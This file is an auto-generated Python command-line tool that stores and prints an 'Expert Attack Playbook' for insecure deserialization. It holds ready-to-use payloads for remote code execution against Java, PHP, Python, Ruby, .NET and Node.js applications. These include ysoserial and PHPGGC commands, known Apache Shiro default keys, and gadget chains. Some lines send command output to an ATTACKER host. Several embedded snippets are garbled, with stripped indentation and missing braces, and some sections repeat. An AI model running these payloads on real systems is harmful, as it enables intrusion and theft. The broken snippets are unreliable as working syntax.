#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/deserialization-insecure

Skill: SKILL: Insecure Deserialization — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-deserialization-insecure.py --help
      python hack-skills-deserialization-insecure.py --list
      python hack-skills-deserialization-insecure.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/deserialization-insecure'
TITLE = 'SKILL: Insecure Deserialization — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: deserialization-insecure", "description: >-", "Insecure deserialization playbook. Use when Java, PHP, or Python applications deserialize untrusted data via ObjectInputStream, unserialize, pickle, or similar mechanisms that may lead to RCE, file access, or privilege escalation."],
    'skill-insecure-deserialization-expert-attack-playbook': [],
    '0-related-routing': ["- [jndi-injection](../jndi-injection/SKILL.md) when deserialization leads to JNDI lookup (e.g., post-JDK 8u191 bypass via LDAP \u2192 deserialization)", "- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) when the deserialization endpoint is an exposed management service (RMI Registry, T3, AJP)", "- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when a WAF blocks your BCEL ClassLoader or Fastjson `@type` payload \u2014 Ghost Bits wraps each bytecode byte in a Unicode char whose low 8 bits match, yielding a payload the WAF cannot fingerprint"],
    'advanced-reference': ["Also load [JAVA_GADGET_CHAINS.md](./JAVA_GADGET_CHAINS.md) when you need:", "- Java gadget chain version compatibility matrix (CommonsCollections 1\u20137, CommonsBeanutils, Spring, JDK-only, Groovy, Hibernate, ROME, C3P0, etc.)", "- SnakeYAML gadget (ScriptEngineManager/URLClassLoader) with exploit JAR structure", "- Hessian/Kryo/Avro/XStream deserialization patterns and traffic fingerprints", "- .NET ViewState deserialization (machineKey requirement, ViewState forgery with ysoserial.net, Blacklist3r)", "- Ruby YAML.load vs YAML.safe_load exploitation with version-specific chains", "- Detection fingerprints: magic bytes table by format (Java `AC ED`, .NET `AAEAAD`, Python pickle `80 0N`, PHP `O:`, Ruby `04 08`)"],
    '1-traffic-fingerprinting-is-it-deserialization': [],
    'java-serialized-objects': [],
    'php-serialized-objects': [],
    'python-pickle': [],
    '2-java-gadget-chains-and-tools': [],
    'ysoserial-primary-tool': ["```bash"],
    'generate-payload-example-commonscollections1-chain-with-command': ["java -jar ysoserial.jar CommonsCollections1 \"curl http://ATTACKER/pwned\" > payload.bin"],
    'base64-encode-for-http-transport': ["java -jar ysoserial.jar CommonsCollections1 \"id\" | base64 -w0"],
    'common-chains-to-try-ordered-by-frequency-of-vulnerable-dependency': [],
    'commonscollections1-7-apache-commons-collections-3-x-4-x': [],
    'spring1-spring2-spring-framework': [],
    'groovy1-groovy': [],
    'hibernate1-hibernate': [],
    'jbossinterceptors1-jboss': [],
    'jdk7u21-jdk-7u21-no-extra-dependency': [],
    'urldns-dns-only-confirmation-no-rce-works-everywhere': [],
    'urldns-safe-confirmation-probe': ["URLDNS triggers a DNS lookup without RCE \u2014 safe for confirming deserialization without damage:", "```bash", "java -jar ysoserial.jar URLDNS \"http://UNIQUE_TOKEN.burpcollaborator.net\" > probe.bin", "DNS hit on collaborator = confirmed deserialization. Then escalate to RCE chains."],
    'commons-collections-the-classic-chain': ["The vulnerability exists when `org.apache.commons.collections` (3.x) is on the classpath and the application calls `readObject()` on untrusted data.", "Key classes in the chain: `InvokerTransformer` \u2192 `ChainedTransformer` \u2192 `TransformedMap` \u2192 triggers `Runtime.exec()` during deserialization."],
    'apache-shiro-rememberme-deserialization': ["Shiro uses AES-CBC to encrypt serialized Java objects in the `rememberMe` cookie.", "```text", "Known hard-coded keys (SHIRO-550 / CVE-2016-4437):", "kPH+bIxk5D2deZiIxcaaaA==          # most common default", "wGJlpLanyXlVB1LUUWolBg==          # another common default in older versions", "4AvVhmFLUs0KTA3Kprsdag==", "Z3VucwAAAAAAAAAAAAAAAA==", "**Attack flow**:", "1. Detect: response sets `rememberMe=deleteMe` cookie on invalid session", "2. Generate ysoserial payload (CommonsCollections6 recommended for broad compat)", "3. AES-CBC encrypt with known key + random IV", "4. Base64-encode \u2192 set as `rememberMe` cookie value", "5. Send request \u2192 server decrypts \u2192 deserializes \u2192 RCE", "**DNSLog confirmation** (before full RCE): use URLDNS chain \u2192 `java -jar ysoserial.jar URLDNS \"http://xxx.dnslog.cn\"` \u2192 encrypt \u2192 set cookie \u2192 check DNSLog for hit.", "**Post-fix (random key)**: Key may still leak via padding oracle, or another CVE (SHIRO-721)."],
    'weblogic-deserialization': ["Multiple vectors:", "- **T3 protocol** (port 7001): direct serialized object injection", "- **XMLDecoder** (CVE-2017-10271): XML-based deserialization via `/wls-wsat/CoordinatorPortType`", "- **IIOP protocol**: alternative to T3", "```bash"],
    't3-probe-check-if-t3-is-exposed': ["nmap -sV -p 7001 TARGET"],
    'look-for-t3-or-weblogic-in-service-banner': [],
    'java-rmi-registry': ["RMI Registry (port 1099) accepts serialized objects by design:", "```bash"],
    'ysoserial-exploit-module-for-rmi': ["java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit TARGET 1099 CommonsCollections1 \"id\""],
    'requires-vulnerable-library-on-target-s-classpath': [],
    'works-on-jdk-8u111-without-jep-290-deserialization-filter': [],
    'jdk-version-constraints': [],
    '3-php-unserialize-and-phar': [],
    'magic-method-chain': ["PHP deserialization triggers magic methods in order:", "__wakeup()  \u2192 called immediately on unserialize()", "__destruct() \u2192 called when object is garbage-collected", "__toString() \u2192 called when object is used as string", "__call()     \u2192 called for inaccessible methods", "**Attack**: craft a serialized object whose `__destruct()` or `__wakeup()` triggers dangerous operations (file write, SQL query, command execution, SSRF)."],
    'serialized-object-format': ["```php", "O:8:\"ClassName\":2:{s:4:\"prop\";s:5:\"value\";s:4:\"cmd\";s:2:\"id\";}", "// O:LENGTH:\"CLASS\":PROP_COUNT:{PROPERTIES}"],
    'phpmyadmin-configuration-injection-real-world-case': ["phpMyAdmin `PMA_Config` class reads arbitrary files via `source` property:", "```text", "action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\";s:11:\"/etc/passwd\";}"],
    'phpggc-php-gadget-chain-generator': ["```bash"],
    'list-available-chains': ["phpggc -l"],
    'generate-payload-example-laravel-rce': ["phpggc Laravel/RCE1 system id"],
    'common-chains': [],
    'laravel-rce1-10': [],
    'symfony-rce1-4': [],
    'guzzle-rce1': [],
    'monolog-rce1-2': [],
    'wordpress-rce1': [],
    'slim-rce1': [],
    'phar-deserialization': ["Phar archives contain serialized metadata. Any file operation on a `phar://` URI triggers deserialization \u2014 even when `unserialize()` is never directly called.", "**Triggering functions** (partial list):", "file_exists()    file_get_contents()    fopen()", "is_file()        is_dir()               copy()", "filesize()       filetype()             stat()", "include()        require()              getimagesize()", "**Attack flow**:", "1. Upload a valid file (e.g., JPEG with phar polyglot)", "2. Trigger file operation: `file_exists(\"phar://uploads/avatar.jpg\")`", "3. PHP deserializes phar metadata \u2192 gadget chain executes", "```bash"],
    'generate-phar-with-phpggc': ["phpggc -p phar -o exploit.phar Monolog/RCE1 system id"],
    '4-python-pickle': [],
    'reduce-method': ["Python's `pickle.loads()` calls `__reduce__()` on objects during deserialization, which can return a callable + args:", "```python", "import pickle", "import os", "class Exploit:", "def __reduce__(self):", "return (os.system, (\"id\",))", "payload = pickle.dumps(Exploit())"],
    'send-payload-to-target-that-calls-pickle-loads': [],
    'analyzing-pickle-opcodes': ["```python", "import pickletools", "pickletools.dis(payload)"],
    'shows-opcodes-global-reduce-etc': [],
    'look-for-global-referencing-dangerous-modules-os-subprocess-builtins': [],
    'common-python-deserialization-sinks': ["```python", "pickle.loads(user_data)", "pickle.load(file_handle)", "yaml.load(data)           # PyYAML without Loader=SafeLoader", "jsonpickle.decode(data)", "shelve.open(path)"],
    'defensive-bypass-restrictedunpickler': ["Even when `RestrictedUnpickler.find_class` is used, check if the whitelist is too broad:", "```python", "class RestrictedUnpickler(pickle.Unpickler):", "def find_class(self, module, name):", "if module == \"builtins\" and name in safe_builtins:", "return getattr(builtins, name)", "raise pickle.UnpicklingError(f\"forbidden: {module}.{name}\")", "If `safe_builtins` includes `eval`, `exec`, or `__import__` \u2192 still exploitable."],
    '5-detection-methodology': ["Found binary blob or encoded object in request/cookie?", "\u251c\u2500\u2500 Java signature (ac ed / rO0AB)?", "\u2502   \u251c\u2500\u2500 Use URLDNS probe for safe confirmation", "\u2502   \u251c\u2500\u2500 Identify libraries (error messages, known product)", "\u2502   \u2514\u2500\u2500 Try ysoserial chains matching identified libraries", "\u251c\u2500\u2500 PHP signature (O:N:\"...)?", "\u2502   \u251c\u2500\u2500 Identify framework (Laravel, Symfony, WordPress)", "\u2502   \u251c\u2500\u2500 Try PHPGGC chains for that framework", "\u2502   \u2514\u2500\u2500 Check for phar:// wrapper in file operations", "\u251c\u2500\u2500 Python (opaque binary, base64 blob)?", "\u2502   \u251c\u2500\u2500 Try pickle payload with DNS callback", "\u2502   \u2514\u2500\u2500 Check if PyYAML unsafe load is used", "\u2514\u2500\u2500 Not sure?", "\u251c\u2500\u2500 Try URLDNS payload (Java) \u2014 check DNS", "\u251c\u2500\u2500 Try PHP serialized test string", "\u2514\u2500\u2500 Monitor error messages for class loading failures"],
    '6-defense-awareness': [],
    '7-quick-reference-key-payloads': ["```text"],
    'java-urldns-confirmation': ["java -jar ysoserial.jar URLDNS \"http://TOKEN.collab.net\""],
    'java-rce-via-commonscollections': ["java -jar ysoserial.jar CommonsCollections1 \"curl http://ATTACKER/pwned\""],
    'php-laravel-rce': ["phpggc Laravel/RCE1 system \"id\""],
    'php-phar-polyglot': ["phpggc -p phar -o exploit.phar Monolog/RCE1 system \"id\""],
    'python-pickle-rce': ["python3 -c \"import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()).hex())\""],
    'shiro-default-key-test': ["rememberMe=<AES-CBC(key=kPH+bIxk5D2deZiIxcaaaA==, payload=ysoserial_output)>"],
    '8-ruby-deserialization': [],
    'ruby-marshal': ["- `Marshal.load` on untrusted data \u2192 RCE", "- Fingerprint: binary data, no common text header", "- Gadget chains exist for various Ruby versions", "- Docker verification: hex payload via `[hex_string].pack(\"H*\")`"],
    'ruby-yaml-yaml-load': ["- `YAML.load` (not `YAML.safe_load`) executes arbitrary Ruby objects", "- **Pre Ruby 2.7.2**: `Gem::Requirement` chain \u2192 `git_set: id` / `git_set: sleep 600`", "- **Ruby 2.x-3.x**: `Gem::Installer` \u2192 `TarReader` \u2192 `Kernel#system` chain (longer, multi-step)", "- Always test: `YAML.load(\"--- !ruby/object:Gem::Installer\\ni: x\")` for class instantiation check", "- Payload template:", "```yaml", "requirements:", "!ruby/object:Gem::DependencyList", "type: :runtime", "specs:", "- !ruby/object:Gem::StubSpecification", "loaded_from: \"|id\"", "- Note: `YAML.safe_load` is safe (Ruby 2.1+); `Psych.safe_load` also safe"],
    '9-net-deserialization': ["- **Traffic fingerprint**:", "- BinaryFormatter: hex `AAEAAD` (base64 `AAEAAAD/////`)", "- ViewState: hex `FF01` or `/w` prefix", "- JSON.NET: `$type` property in JSON", "- **BinaryFormatter** (most dangerous, deprecated in .NET 5+): arbitrary type instantiation", "- **XmlSerializer**: `ObjectDataProvider` + `XamlReader` chain for command execution", "```xml", "<root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:od=\"http://schemas.microsoft.com/powershell/2004/04\" type=\"System.Windows.Data.ObjectDataProvider\">", "<od:MethodName>Start</od:MethodName>", "<od:MethodParameters><sys:String>cmd</sys:String><sys:String>/c calc</sys:String></od:MethodParameters>", "<od:ObjectInstance xsi:type=\"System.Diagnostics.Process\"/>", "</root>", "- **NetDataContractSerializer**: similar to BinaryFormatter, full type info in XML", "- **LosFormatter**: used in ViewState, deserializes to `ObjectStateFormatter`", "- **JSON.NET**: `$type` property enables type control \u2192 `ObjectDataProvider` + `ExpandedWrapper` chains", "```json", "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\",\"MethodName\":\"Start\",\"MethodParameters\":{\"$type\":\"System.Collections.ArrayList\",\"$values\":[\"cmd\",\"/c calc\"]},\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}", "- **Tool**: `ysoserial.net` \u2014 generate payloads for all .NET formatters", "```text", "ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c \"calc\" -o base64", "ysoserial.exe -f Json.Net -g ObjectDataProvider -c \"calc\"", "- **POP gadgets**: `ObjectDataProvider`, `ExpandedWrapper`, `AssemblyInstaller.set_Path`"],
    '10-node-js-deserialization': ["- **node-serialize**: `unserialize()` with IIFE (Immediately Invoked Function Expression)", "- Payload marker: `_$$ND_FUNC$$_`", "- Add `()` at end to auto-execute:", "```json", "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('COMMAND')}()\"}", "- **funcster**: `__js_function` property \u2192 `constructor.constructor` to access `process`", "```json", "{\"__js_function\":\"function(){return global.process.mainModule.require('child_process').execSync('id').toString()}\"}", "- **cryo**: similar to funcster, serializes JS objects with function support"],
    'ruby-deserialization': [],
    'marshal-binary-format': ["```ruby"],
    'ruby-s-marshal-load-is-equivalent-to-java-s-objectinputstream': [],
    'any-class-with-marshal-dump-marshal-load-can-be-a-gadget': [],
    'detection-binary-data-starting-with-x04-x08': [],
    'or-hex-0408': [],
    'poc-gadget-requires-vulnerable-class-in-scope': ["payload = \"\\x04\\x08...\" # hex-encoded gadget chain", "Marshal.load(payload)    # triggers arbitrary code execution"],
    'yaml-load-critical-most-common-ruby-deser-sink': ["```ruby"],
    'yaml-load-not-yaml-safe-load-deserializes-arbitrary-ruby-objects': [],
    'ruby-2-7-2-gem-requirement-chain': [],
    'triggers-via-ruby-object-constructor': ["!ruby/object:Gem::Requirement", "requirements:", "!ruby/object:Gem::DependencyList", "specs:", "- !ruby/object:Gem::Source", "current_fetch_uri: !ruby/object:URI::Generic", "path: \"| id\""],
    'ruby-2-x-3-x-gem-installer-chain': [],
    'uses-gem-installer-gem-stubspecification-kernel-system': ["!ruby/hash:Gem::Installer", "!ruby/hash:Gem::SpecFetcher", "!ruby/object:Gem::Requirement", "requirements:", "!ruby/object:Gem::Package::TarReader", "io: &1 !ruby/object:Net::BufferedIO", "io: &1 !ruby/object:Gem::Package::TarReader::Entry", "read: 0", "header: \"abc\"", "debug_output: &1 !ruby/object:Net::WriteAdapter", "socket: &1 !ruby/object:Gem::RequestSet", "sets: !ruby/object:Net::WriteAdapter", "socket: !ruby/module 'Kernel'", "method_id: :system", "git_set: id    # <-- command to execute", "method_id: :resolve"],
    'safe-alternative-yaml-safe-load-whitelist-of-allowed-types': [],
    'tools': ["- `elttam/ruby-deserialization` \u2014 Ruby gadget chain generator", "- `frohoff/ysoserial` inspiration \u2192 check Ruby-specific forks"],
    'net-deserialization': [],
    'traffic-fingerprinting': [],
    'binaryformatter-losformatter': [],
    'most-dangerous-arbitrary-type-instantiation': [],
    'tool-ysoserial-net': ["ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"calc.exe\" -o base64", "ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c \"cmd /c whoami > C:\\\\out.txt\" -o base64"],
    'losformatter-wraps-binaryformatter-same-gadgets-work': ["ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"calc.exe\" -o base64"],
    'xmlserializer-objectdataprovider': ["```xml", "<root>", "<ObjectDataProvider MethodName=\"Start\" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\">", "<ObjectDataProvider.MethodParameters>", "<sys:String xmlns:sys=\"clr-namespace:System;assembly=mscorlib\">cmd.exe</sys:String>", "<sys:String xmlns:sys=\"clr-namespace:System;assembly=mscorlib\">/c whoami</sys:String>", "</ObjectDataProvider.MethodParameters>", "<ObjectDataProvider.ObjectInstance>", "<ProcessStartInfo xmlns=\"clr-namespace:System.Diagnostics;assembly=System\">", "<ProcessStartInfo.FileName>cmd.exe</ProcessStartInfo.FileName>", "<ProcessStartInfo.Arguments>/c whoami</ProcessStartInfo.Arguments>", "</ProcessStartInfo>", "</ObjectDataProvider.ObjectInstance>", "</ObjectDataProvider>", "</root>"],
    'json-net-with-typenamehandling': ["```json", "\"$type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework\",", "\"MethodName\": \"Start\",", "\"MethodParameters\": {", "\"$type\": \"System.Collections.ArrayList, mscorlib\",", "\"$values\": [\"cmd.exe\", \"/c whoami\"]", "\"ObjectInstance\": {", "\"$type\": \"System.Diagnostics.Process, System\"", "Vulnerable when `TypeNameHandling` is set to `Auto`, `Objects`, `Arrays`, or `All`."],
    'tools': ["- `pwntester/ysoserial.net` \u2014 primary .NET deserialization payload generator", "- Gadget chains: TypeConfuseDelegate, TextFormattingRunProperties, PSObject, ActivitySurrogateSelectorFromFile"],
    'node-js-deserialization': [],
    'node-serialize-iife-pattern': ["```javascript", "// node-serialize uses eval() internally", "// Payload uses _$$ND_FUNC$$_ marker + IIFE:", "var payload = '{\"rce\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'id\\',function(error,stdout,stderr){console.log(stdout)});}()\"}';", "// The trailing () makes it an Immediately Invoked Function Expression", "// When unserialize() processes this, it executes the function", "// Full HTTP exploit (in cookie or body):", "{\"username\":\"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://ATTACKER/?x=$(id|base64)',function(e,o,s){});}()\",\"email\":\"test@test.com\"}"],
    'funcster': ["```javascript", "// funcster deserializes functions via constructor.constructor pattern:", "{\"__js_function\":\"function(){var net=this.constructor.constructor('return require')()('child_process');return net.execSync('id').toString();}\"}"],
    'php-create-function-deserialization-combo': ["```php", "// When a PHP class uses create_function in __destruct or __wakeup:", "// Serialize an object where:", "$a = \"create_function\";", "$b = \";}system('id');/*\";", "// The lambda body becomes: function(){ ;}system('id');/* }", "// Closing the original function body and injecting a command", "// In serialized form, private properties need \\0ClassName\\0 prefix:", "O:7:\"Noteasy\":2:{s:19:\"\\0Noteasy\\0method_name\";s:15:\"create_function\";s:14:\"\\0Noteasy\\0args\";s:21:\";}system('id');/*\";}"],
    '11-ruby-deserialization': [],
    'marshal': ["```ruby"],
    'ruby-s-native-serialization-dangerous-when-deserializing-untrusted-data': [],
    'detection-binary-data-starting-with-x04-x08': [],
    'one-liner-gadget-verification-hex-encoded-payload': ["payload = [\"040802\"].pack(\"H*\")  # Minimal Marshal header", "Marshal.load(payload)"],
    'yaml-cve-rich-surface': ["```ruby"],
    'yaml-load-is-dangerous-equivalent-to-eval-for-ruby-objects': [],
    'safe-alternative-yaml-safe-load': [],
    'ruby-2-7-2-gem-requirement-chain': ["requirements:", "- !ruby/object:Gem::DependencyList", "specs:", "- !ruby/object:Gem::Source", "uri: \"| id\""],
    'ruby-2-x-3-x-gem-installer-chain-more-complex': [],
    'triggers-git-set-kernel-system': [],
    'full-chain-available-in-ysoserial-ruby-blind-ruby-deserialization': [],
    'universal-detection-supply-yaml-that-triggers-dns-callback': ["uri: http://BURP_COLLAB/", "**Tools**: `elttam/ruby-deserialization`, `mbechler/ysoserial` (Ruby variant)"],
    '12-net-deserialization': [],
    'fingerprinting': [],
    'binaryformatter-most-dangerous': [],
    'always-dangerous-when-deserializing-untrusted-data': [],
    'tool-ysoserial-net': ["ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c \"whoami\" -o base64", "ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c \"calc\" -o raw"],
    'viewstate-asp-net': [],
    'if-viewstate-is-not-mac-protected-enableviewstatemac-false': ["ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --validationalg=\"SHA1\" --validationkey=\"KNOWN_KEY\""],
    'leak-machinekey-from-web-config-via-lfi-backup-forge-viewstate': [],
    'xmlserializer-objectdataprovider': ["```xml", "<root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"", "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">", "<ObjectDataProvider MethodName=\"Start\">", "<ObjectInstance xsi:type=\"Process\">", "<StartInfo>", "<FileName>cmd.exe</FileName>", "<Arguments>/c whoami</Arguments>", "</StartInfo>", "</ObjectInstance>", "</ObjectDataProvider>", "</root>"],
    'json-net-type-abuse': ["```json", "\"$type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework\",", "\"MethodName\": \"Start\",", "\"ObjectInstance\": {", "\"$type\": \"System.Diagnostics.Process, System\",", "\"StartInfo\": {", "\"$type\": \"System.Diagnostics.ProcessStartInfo, System\",", "\"FileName\": \"cmd.exe\",", "\"Arguments\": \"/c whoami\"", "Vulnerable when `TypeNameHandling != None` in JSON deserialization settings."],
    'tools': ["- `pwntester/ysoserial.net` \u2014 primary .NET gadget chain generator", "- `NotSoSecure/Blacklist3r` \u2014 decrypt/forge ViewState with known machineKey"],
    '13-node-js-deserialization': [],
    'node-serialize-iife-injection': ["```javascript", "// Vulnerable pattern:", "var serialize = require('node-serialize');", "var obj = serialize.unserialize(userInput);", "// Payload: IIFE (Immediately Invoked Function Expression)", "// The _$$ND_FUNC$$_ prefix signals a serialized function", "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()\"}", "// Key: the () at the end causes immediate execution upon deserialization"],
    'funcster': ["```javascript", "// Vulnerable: funcster.deepDeserialize(userInput)", "// Payload uses __js_function to inject via constructor chain:", "{\"__js_function\":\"function(){var net=this.constructor.constructor('return this')().process.mainModule.require('child_process');return net.execSync('id').toString()}()\"}"],
    'php-create-function-deserialization-combo': ["```php", "// When create_function is available and object is deserialized:", "// Payload creates lambda with injected code:", "$a = \"create_function\";", "$b = \";}system('id');/*\";", "// The lambda body becomes: function anonymous() { ;}system('id');/* }", "// Effective: close original body, inject command, comment out rest", "// In serialized form (with private property \\0ClassName\\0):", "O:8:\"ClassName\":2:{s:13:\"\\0ClassName\\0func\";s:15:\"create_function\";s:12:\"\\0ClassName\\0arg\";s:18:\";}system('id');/*\";}"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()